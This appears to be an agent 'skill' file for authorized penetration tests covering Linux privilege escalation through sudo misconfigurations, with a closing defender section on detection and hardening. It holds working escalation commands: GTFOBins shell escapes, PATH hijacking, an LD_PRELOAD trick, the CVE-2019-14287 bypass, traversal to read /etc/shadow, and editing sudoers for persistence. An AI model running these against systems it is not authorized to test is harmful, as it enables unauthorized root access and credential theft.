---
name: sudo-misconfig
description: Use when you have a Linux shell on an authorized engagement
  and need to review sudo rights for privilege escalation. Covers sudo -l
  enumeration, NOPASSWD abuse, GTFOBins sudo techniques, wildcard and
  environment tricks, and sudo version CVEs. Use when starting Linux
  privilege escalation, when you know the user password, or when LinPEAS
  flags sudo entries.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
parent: privesc-linux
requires: [privesc-linux]
extends: []
relates: [linux-hardening]
tools:
  - name: Sudo
    version: 1.9
  - name: Python
    version: 3.12
---

Sudo misconfigurations are the most common Linux privilege escalation:
users granted more than they need, often with NOPASSWD. This skill covers
the sudo review workflow on authorized engagements: enumerating rights,
matching binaries to GTFOBins sudo techniques, and exploiting wildcard and
environment weaknesses. Run it right after suid-binaries; together they
resolve most Linux privesc in minutes.

## Quick Workflow

1. List sudo rights with `sudo -l`, with and without the password.
2. Flag NOPASSWD entries and ALL grants immediately.
3. Look up each allowed binary in GTFOBins for sudo techniques.
4. Inspect wildcards, relative paths, and environment handling in the
   sudoers entries.
5. Check the sudo version against known CVEs.
6. Exploit the weakest entry with a clean, provable technique.
7. Record the exact sudoers line and the escalation path.

## 1. Enumeration

```bash
# List rights (needs the user password unless NOPASSWD or cached)
sudo -l
# No password available: still try, it may not need one
sudo -n -l 2>&1 | head -30

# Read the sudoers files directly if you can (usually root-only, but check)
cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'
ls -la /etc/sudoers.d/ 2>/dev/null

# Sudo version for CVE checks
sudo --version | head -2
```

Read every line of `sudo -l` output. `(ALL) NOPASSWD: ALL` is game over;
`(ALL) /usr/bin/vim` is nearly as good through GTFOBins; narrow entries
need the wildcard and environment analysis below.

## 2. GTFOBins sudo techniques

```bash
# Pattern: any allowed binary with a shell escape or file write is root
# Verify the technique for the exact binary in GTFOBins, then:

# Example shape (vim): sudo vim -> :!/bin/sh
# Example shape (less): sudo less /etc/hosts -> !/bin/sh
# Example shape (find): sudo find / -exec /bin/sh \;
# Example shape (python): sudo python3 -c 'import os; os.system("/bin/sh")'

# Safe proof first: run id through the technique
sudo find /etc -name hosts -exec id \; 2>/dev/null | head -3
```

Prefer the least destructive working technique. A shell escape is cleaner
than overwriting system files, and the report reads better for it.

## 3. Wildcards, paths, and environment

```bash
# Wildcard abuse: (ALL) /usr/bin/vim /etc/* lets you edit sudoers itself
# Check what the wildcard really allows:
sudo -l | grep -E '\*'

# Relative path or missing path: does sudo use a secure path?
sudo -l | grep -i 'secure_path'
# If you can run 'sudo mytool' and mytool resolves via your PATH,
# plant your own mytool

# LD_PRELOAD and environment: check env_keep and SETENV tag
sudo -l | grep -i -E 'env|setenv'
# (ALL, SETENV) /usr/bin/python3 -> sudo LD_PRELOAD=/tmp/evil.so python3

# CVE-2019-14287: (ALL, !root) bypass with -u#-1
sudo -u#-1 /bin/bash  # only if the version is vulnerable; check first
```

Wildcards in file arguments are the classic sudoers authoring mistake:
`/bin/cat /var/log/*` becomes `/bin/cat /var/log/../../etc/shadow` unless
the sudoers uses proper patterns. Test the traversal, not just the
intended path.

## Edge cases

- `sudo -l` needs a password you do not have. Try `sudo -n -l` for the
  NOPASSWD entries, which are the ones that matter most anyway.
- The allowed binary has no GTFOBins entry. Read its man page for shell
  escapes, file writes, and library loads; custom admin tools are often
  exploitable.
- Sudo logs everything to a remote syslog. Note it in your opsec
  considerations; the technique still works, but it is not quiet.
- The entry allows a script you can read but not write. Read it for
  command injection in its arguments or wildcards before moving on.

## Escalation

- Sudo yields nothing: move to cron-abuse and kernel-exploits in the
  privesc-linux order.
- The sudoers file itself is writable: add your own entry, use it, and
  consider whether the engagement wants the persistence removed after.
- Sudo version is old: check CVE-2019-14287, CVE-2021-3156 (Baron
  Samedit), and CVE-2023-22809 against the exact version, and test only
  with approval since version exploits can be unstable.

## Detection and defender view

Defenders see sudo escalation in the sudo logs (every invocation with the
command line), in auth logs, and in EDR process trees showing shells
spawned from sudo. Centralized sudo logging to a remote syslog is the key
telemetry. Defenses are least-privilege sudoers with no NOPASSWD where
avoidable, no wildcards in file arguments, `secure_path` set, regular
sudoers review, and alerting on unusual sudo commands.

## Key references

- MITRE ATT&CK T1548.003 (Abuse Elevation Control Mechanism: Sudo and
  Sudo Caching).
- CWE-250 (Execution with Unnecessary Privileges).
- CWE-269 (Improper Privilege Management).
- GTFOBins: sudo techniques per binary.
- sudo CVEs: CVE-2019-14287, CVE-2021-3156, CVE-2023-22809.
